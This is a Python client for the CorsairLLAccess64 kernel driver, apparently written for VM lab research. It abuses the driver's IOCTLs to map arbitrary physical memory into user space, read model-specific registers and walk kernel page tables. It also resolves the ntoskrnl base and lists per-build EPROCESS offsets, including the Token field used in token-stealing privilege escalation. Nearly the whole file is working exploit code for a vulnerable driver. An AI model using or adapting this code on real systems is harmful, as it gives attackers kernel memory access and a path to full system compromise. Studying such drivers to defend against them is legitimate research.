"""
CorsairLLAccess64 lab client — SAFE BY DEFAULT.

PHYS RAM SCANNING IS DISABLED.
Even map-only scans (~32MB) bugcheck this VM/driver. Do not re-enable.

Workflow:
  1. Safe probe + RDMSR LSTAR (default)
  2. Get System CR3 from WinDbg/livekd (no driver scan)
  3. --cr3 0x... --translate-lstar  (only ~4-8 page maps for the walk)
"""

import argparse
import ctypes
import ctypes.wintypes
import struct
import sys
import subprocess
import winreg

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
FILE_ATTRIBUTE_NORMAL = 0x80
FILE_SHARE_READ = 0x1
FILE_SHARE_WRITE = 0x2
FILE_SHARE_DELETE = 0x4
INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value

IOCTL_MAP_PHYS_MEM = 0x00225374
IOCTL_READ_MSR = 0x00225388
# IOCTL_UNMAP 0x229378 — NEVER call (PFN_LIST_CORRUPT)

DRIVER_SYMBOLIC_LINK = r"\\.\CorsairLLAccess64"
SERVICE_NAME = "CorsairLLAccess64"
NTOSKRNL_PATH = r"C:\Windows\System32\ntoskrnl.exe"

OFF_DIR_TABLE_BASE = 0x28
IA32_LSTAR = 0xC0000082
PAGE_SIZE = 0x1000
PTE_PHYS_MASK = 0x000FFFFFFFFFF000

UNMAP_BAD_LO = 0x180000
UNMAP_BAD_HI = 0x1C0000

SystemModuleInformation = 11

EPROCESS_OFFSETS = {
    26200: (0x1D0, 0x338, 0x248, 0x1D8),
    26100: (0x1D0, 0x338, 0x248, 0x1D8),
    22631: (0x440, 0x5A8, 0x4B8, 0x448),
    22621: (0x440, 0x5A8, 0x4B8, 0x448),
    22000: (0x440, 0x5A8, 0x4B8, 0x448),
    19045: (0x440, 0x5A8, 0x4B8, 0x448),
}

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
ntdll = ctypes.WinDLL("ntdll", use_last_error=True)

HANDLE = ctypes.c_void_p
DWORD = ctypes.wintypes.DWORD
BOOL = ctypes.wintypes.BOOL
LPVOID = ctypes.c_void_p
ULONG_PTR = ctypes.c_size_t
NTSTATUS = ctypes.wintypes.LONG

kernel32.CreateFileW.restype = HANDLE
kernel32.CreateFileW.argtypes = [
    ctypes.wintypes.LPCWSTR, DWORD, DWORD, LPVOID, DWORD, DWORD, HANDLE
]
kernel32.DeviceIoControl.restype = BOOL
kernel32.DeviceIoControl.argtypes = [
    HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, ctypes.POINTER(DWORD), LPVOID
]
kernel32.CloseHandle.restype = BOOL
kernel32.CloseHandle.argtypes = [HANDLE]
ntdll.NtQuerySystemInformation.restype = NTSTATUS
ntdll.NtQuerySystemInformation.argtypes = [DWORD, LPVOID, ULONG_PTR, LPVOID]

_MAP_CACHE = {}
_LAST_MAP_ERROR = 0


def is_invalid_handle(handle):
    if handle is None:
        return True
    value = handle if isinstance(handle, int) else getattr(handle, "value", handle)
    return value in (None, 0, INVALID_HANDLE_VALUE, -1, 0xFFFFFFFF)


def get_windows_build():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion",
        )
        build, _ = winreg.QueryValueEx(key, "CurrentBuildNumber")
        display, _ = winreg.QueryValueEx(key, "DisplayVersion")
        winreg.CloseKey(key)
        return str(display), int(build)
    except OSError:
        return "?", 0


def resolve_eprocess_offsets(build):
    if build in EPROCESS_OFFSETS:
        return EPROCESS_OFFSETS[build]
    if build >= 26100:
        return EPROCESS_OFFSETS[26100]
    return EPROCESS_OFFSETS[22621]


def open_driver_handle():
    print(f"[*] Opening {DRIVER_SYMBOLIC_LINK}")
    handle = kernel32.CreateFileW(
        DRIVER_SYMBOLIC_LINK,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        None,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        None,
    )
    if is_invalid_handle(handle):
        err = ctypes.get_last_error()
        print(f"[-] CreateFile failed: {err} (0x{err:X})")
        try:
            r = subprocess.run(
                ["sc.exe", "query", SERVICE_NAME],
                capture_output=True, text=True, timeout=15,
            )
            print(r.stdout or r.stderr)
        except Exception:
            pass
        print("    After reboot: sc.exe start CorsairLLAccess64")
        return None
    print(f"[+] Handle OK: {handle}")
    return handle


def close_driver_handle(handle):
    if handle and not is_invalid_handle(handle):
        kernel32.CloseHandle(handle)


def overlaps_bad_zone(pa, size):
    return not (pa + size <= UNMAP_BAD_LO or pa >= UNMAP_BAD_HI)


def map_page(driver_handle, page_pa, quiet=True):
    """Map one 4KB page. Cached. Never unmapped."""
    global _LAST_MAP_ERROR
    page_pa &= ~0xFFF
    if page_pa in _MAP_CACHE:
        return _MAP_CACHE[page_pa]
    if overlaps_bad_zone(page_pa, PAGE_SIZE):
        _LAST_MAP_ERROR = -1
        return None

    inp = ctypes.create_string_buffer(16)
    struct.pack_into("<Q", inp, 0, page_pa)
    struct.pack_into("<I", inp, 8, PAGE_SIZE)
    struct.pack_into("<I", inp, 12, 0)
    mapped = ctypes.c_uint64(0)
    ret = DWORD(0)
    ctypes.set_last_error(0)
    ok = kernel32.DeviceIoControl(
        driver_handle, IOCTL_MAP_PHYS_MEM,
        inp, 16, ctypes.byref(mapped), 8, ctypes.byref(ret), None,
    )
    if not ok or not mapped.value:
        _LAST_MAP_ERROR = ctypes.get_last_error()
        if not quiet:
            print(f"[-] MAP PA 0x{page_pa:X}: {_LAST_MAP_ERROR} (0x{_LAST_MAP_ERROR:X})")
        return None
    _LAST_MAP_ERROR = 0
    _MAP_CACHE[page_pa] = mapped.value
    return mapped.value


def physical_memory_read(driver_handle, physical_address, size, quiet=True):
    out = bytearray()
    remaining = size
    pa = physical_address
    while remaining > 0:
        page_pa = pa & ~0xFFF
        page_off = pa & 0xFFF
        chunk = min(remaining, PAGE_SIZE - page_off)
        va = map_page(driver_handle, page_pa, quiet=quiet)
        if not va:
            return None
        try:
            out.extend(bytes((ctypes.c_ubyte * chunk).from_address(va + page_off)))
        except Exception:
            return None
        pa += chunk
        remaining -= chunk
    return bytes(out)


def read_msr(driver_handle, msr_index):
    inn = ctypes.c_uint64(msr_index)
    out = ctypes.c_uint64(0)
    ret = DWORD(0)
    ok = kernel32.DeviceIoControl(
        driver_handle, IOCTL_READ_MSR,
        ctypes.byref(inn), 8, ctypes.byref(out), 8, ctypes.byref(ret), None,
    )
    if not ok:
        err = ctypes.get_last_error()
        print(f"[-] RDMSR(0x{msr_index:X}): {err} (0x{err:X})")
        return None
    return out.value


def get_ntoskrnl_base():
    size = DWORD(0)
    ntdll.NtQuerySystemInformation(SystemModuleInformation, None, 0, ctypes.byref(size))
    buf = ctypes.create_string_buffer(size.value + 0x1000)
    status = ntdll.NtQuerySystemInformation(
        SystemModuleInformation, buf, len(buf), ctypes.byref(size)
    )
    if status != 0:
        return None
    data = buf.raw[: size.value]
    for name in (b"ntoskrnl.exe", b"ntkrnlmp.exe"):
        idx = data.lower().find(name)
        if idx < 0:
            continue
        for entry_off in range(max(0, idx - 0x28 - 255), idx - 0x27):
            image_base = struct.unpack_from("<Q", data, entry_off + 0x10)[0]
            image_size = struct.unpack_from("<I", data, entry_off + 0x18)[0]
            if image_base >= 0xFFFF800000000000 and 0x100000 <= image_size <= 0x2000000:
                path = data[entry_off + 0x28: entry_off + 0x28 + 256]
                if name in path.lower():
                    return image_base
    return None


def rva_to_file_offset(pe_data, rva):
    if len(pe_data) < 0x40 or pe_data[:2] != b"MZ":
        return None
    e_lfanew = struct.unpack_from("<I", pe_data, 0x3C)[0]
    if pe_data[e_lfanew:e_lfanew + 4] != b"PE\0\0":
        return None
    coff = e_lfanew + 4
    num_sections = struct.unpack_from("<H", pe_data, coff + 2)[0]
    size_opt = struct.unpack_from("<H", pe_data, coff + 16)[0]
    section_table = coff + 20 + size_opt
    for i in range(num_sections):
        off = section_table + i * 40
        va = struct.unpack_from("<I", pe_data, off + 12)[0]
        vsz = struct.unpack_from("<I", pe_data, off + 8)[0]
        raw = struct.unpack_from("<I", pe_data, off + 20)[0]
        rsz = struct.unpack_from("<I", pe_data, off + 16)[0]
        if va <= rva < va + max(vsz, rsz):
            return raw + (rva - va)
    return None


def load_lstar_signature(ntos_base, lstar, sig_len=32):
    if not ntos_base or not lstar or lstar < ntos_base:
        return None
    rva = lstar - ntos_base
    try:
        with open(NTOSKRNL_PATH, "rb") as f:
            pe = f.read()
    except OSError as exc:
        print(f"[-] Cannot read ntoskrnl: {exc}")
        return None
    file_off = rva_to_file_offset(pe, rva)
    if file_off is None or file_off + sig_len > len(pe):
        return None
    sig = pe[file_off: file_off + sig_len]
    print(f"[+] LSTAR sig @ RVA 0x{rva:X}: {sig[:16].hex(' ')}...")
    return sig


def get_physical_ram_ranges():
    path = r"HARDWARE\RESOURCEMAP\System Resources\Physical Memory"
    ranges = []
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
        data, _ = winreg.QueryValueEx(key, ".Translated")
        winreg.CloseKey(key)
    except OSError:
        return ranges
    blob = bytes(data)
    offset = 0
    while offset + 20 <= len(blob):
        if blob[offset] == 3:
            start = struct.unpack_from("<Q", blob, offset + 4)[0]
            length = struct.unpack_from("<Q", blob, offset + 12)[0]
            if length >= PAGE_SIZE and length <= (1 << 40) and start < (1 << 40) and (start & 0xFFF) == 0:
                ranges.append((start, length))
                offset += 20
                continue
        offset += 1
    uniq = []
    for s, l in sorted(ranges):
        if uniq and s < uniq[-1][0] + uniq[-1][1]:
            prev_s, prev_l = uniq[-1]
            uniq[-1] = (prev_s, max(prev_s + prev_l, s + l) - prev_s)
        else:
            uniq.append((s, l))
    return uniq


def pa_in_ram(pa, ram_ranges):
    for s, l in ram_ranges:
        if s <= pa < s + l:
            return True
    return False


def valid_translated_pa(pa, ram_ranges):
    if pa is None or pa >= 0xFFFF800000000000 or pa > 0x10000000000:
        return False
    return pa_in_ram(pa, ram_ranges)


def kva_to_pa(driver_handle, kva, cr3):
    cr3 = cr3 & PTE_PHYS_MASK
    idxs = [
        (kva >> 39) & 0x1FF,
        (kva >> 30) & 0x1FF,
        (kva >> 21) & 0x1FF,
        (kva >> 12) & 0x1FF,
    ]
    off = kva & 0xFFF

    def rq(pa):
        b = physical_memory_read(driver_handle, pa, 8, quiet=True)
        return struct.unpack("<Q", b)[0] if b and len(b) == 8 else None

    print(f"    PML4 @ PA 0x{cr3:X} index {idxs[0]}")
    e = rq(cr3 + idxs[0] * 8)
    if e is None or not (e & 1):
        print("    [-] PML4 miss")
        return None
    print(f"    PML4e=0x{e:X}")

    e = rq((e & PTE_PHYS_MASK) + idxs[1] * 8)
    if e is None or not (e & 1):
        print("    [-] PDPT miss")
        return None
    print(f"    PDPTe=0x{e:X}")
    if e & 0x80:
        return (e & 0x000FFFFFC0000000) + (kva & 0x3FFFFFFF)

    e = rq((e & PTE_PHYS_MASK) + idxs[2] * 8)
    if e is None or not (e & 1):
        print("    [-] PD miss")
        return None
    print(f"    PDe=0x{e:X}")
    if e & 0x80:
        return (e & 0x000FFFFFFFE00000) + (kva & 0x1FFFFF)

    e = rq((e & PTE_PHYS_MASK) + idxs[3] * 8)
    if e is None or not (e & 1):
        print("    [-] PT miss")
        return None
    print(f"    PTe=0x{e:X}")
    return (e & PTE_PHYS_MASK) + off


def safe_probe(driver_handle, ram_ranges):
    print("\n=== SAFE probe (few maps max, NO unmap, NO scan) ===")
    candidates = [0x300000, 0x100000, 0x210000, 0x400000, 0x1000000]
    for start, length in ram_ranges:
        if start >= 0x100000:
            for off in (0, 0x100000, 0x200000):
                pa = (start + off) & ~0xFFF
                if start <= pa and pa + PAGE_SIZE <= start + length and pa not in candidates:
                    candidates.append(pa)

    for pa in candidates[:10]:
        if overlaps_bad_zone(pa, PAGE_SIZE):
            continue
        va = map_page(driver_handle, pa, quiet=True)
        if not va:
            print(f"    [-] PA 0x{pa:X} failed (error={_LAST_MAP_ERROR})")
            continue
        sample = bytes((ctypes.c_ubyte * 16).from_address(va))
        print(f"[+] PA 0x{pa:X} -> VA 0x{va:X}")
        print(f"[+] Bytes: {sample.hex(' ')}")
        print(f"[*] Maps cached: {len(_MAP_CACHE)}")
        return True
    print("[-] Probe failed.")
    return False


def translate_lstar(driver_handle, cr3, lstar, ram_ranges, signature):
    print(f"\n=== KVA-to-PA walk ===")
    print(f"CR3   = 0x{cr3:X}")
    print(f"LSTAR = 0x{lstar:X}")
    pa = kva_to_pa(driver_handle, lstar, cr3)
    if not valid_translated_pa(pa, ram_ranges):
        print(f"[-] Translation failed or PA not in RAM: {pa!r}")
        return False
    print(f"[+] LSTAR -> PA 0x{pa:X}")
    got = physical_memory_read(driver_handle, pa, len(signature) if signature else 16)
    if not got:
        print("[-] Could not read translated PA")
        return False
    print(f"[+] Bytes @ PA: {got[:16].hex(' ')}")
    if signature:
        if got[: len(signature)] == signature:
            print("[+] MATCH ntoskrnl on-disk KiSystemCall64 — walk VERIFIED")
            return True
        print("[-] Bytes mismatch vs ntoskrnl (wrong CR3 or KVA shadow)")
        return False
    return True


def print_windbg_help():
    print(
        """
=== Get System CR3 WITHOUT scanning (recommended) ===
Install WinDbg Preview, enable local kernel debugging, reboot, then:

  kd> !process 0 0 System
  kd> dt nt!_KPROCESS <EPROCESS> DirectoryTableBase

Or:
  kd> !process 0 0 System
  (DirTableBase / DirectoryTableBase in the output)

Then (after snapshot + driver start):
  python driver_interact.py --cr3 0xYOUR_CR3 --translate-lstar

Do NOT run physmem CR3 scans with this driver — they reboot the VM.
"""
    )


def main():
    parser = argparse.ArgumentParser(
        description="CorsairLLAccess64 client — no phys RAM scanning"
    )
    parser.add_argument(
        "--cr3",
        type=lambda x: int(x, 0),
        help="System CR3 / DirectoryTableBase from WinDbg (e.g. 0x1ad000)",
    )
    parser.add_argument(
        "--translate-lstar",
        action="store_true",
        help="Walk IA32_LSTAR with --cr3 (few page maps only)",
    )
    parser.add_argument(
        "--probe",
        action="store_true",
        help="Opt-in: map ONE known-good RAM page (can still be risky)",
    )
    parser.add_argument(
        "--find-cr3",
        action="store_true",
        help="DISABLED — refuses (scans bugcheck this driver)",
    )
    parser.add_argument("--i-accept-bugcheck", action="store_true", help=argparse.SUPPRESS)
    parser.add_argument("--scan-mb", type=int, default=0, help=argparse.SUPPRESS)
    args = parser.parse_args()

    if sys.platform != "win32":
        print("Windows only.")
        return

    disp, build = get_windows_build()
    pid_off, image_off, token_off, _ = resolve_eprocess_offsets(build)

    print("=== CorsairLLAccess64 client ===")
    print(f"Windows: {disp} (build {build})")
    print(
        f"EPROCESS: PID=0x{pid_off:X} ImageFileName=0x{image_off:X} "
        f"Token=0x{token_off:X} DTB=0x{OFF_DIR_TABLE_BASE:X}"
    )
    print("PHYS SCAN: disabled. Default maps: NONE (MSR-only).\n")

    if args.find_cr3 or args.scan_mb or args.i_accept_bugcheck:
        print("[-] --find-cr3 / phys scanning is DISABLED.")
        print("    Mapping many RAM pages with this driver bugchecks the box.")
        print_windbg_help()
        return

    ntos = get_ntoskrnl_base()
    if ntos:
        print(f"[+] ntoskrnl: 0x{ntos:X}")
    ram_ranges = get_physical_ram_ranges()
    if ram_ranges:
        print("[+] RAM ranges loaded")

    h = open_driver_handle()
    if not h:
        return

    try:
        # Default: MSR only — zero physical maps (safest after bugchecks)
        if args.probe:
            if not safe_probe(h, ram_ranges):
                print("[-] Probe failed; continuing with MSR-only.")
        else:
            print("[*] Skipping phys probe (default). Use --probe to map one page.")

        print("\n[*] RDMSR IA32_LSTAR (no phys map)...")
        lstar = read_msr(h, IA32_LSTAR)
        if lstar is not None:
            print(f"[+] IA32_LSTAR = 0x{lstar:X}")
            if ntos:
                print(f"[+] KiSystemCall64 RVA = 0x{lstar - ntos:X}")
        signature = load_lstar_signature(ntos, lstar) if lstar else None

        if args.translate_lstar:
            if not args.cr3:
                print("[-] --translate-lstar requires --cr3 0x...")
                print_windbg_help()
                return
            if not lstar:
                print("[-] No LSTAR")
                return
            print("[!] Page-walk will map a few PTE pages. Snapshot first.")
            ok = translate_lstar(h, args.cr3, lstar, ram_ranges, signature)
            print(f"\n[*] Maps used for walk: {len(_MAP_CACHE)}")
            if ok:
                print("=== SUCCESS: KVA-to-PA works with provided CR3 ===")
            return

        print("\n[*] MSR-only default OK (no phys maps performed).")
        print_windbg_help()

    finally:
        close_driver_handle(h)
        print("\n[*] Handle closed.")


if __name__ == "__main__":
    main()
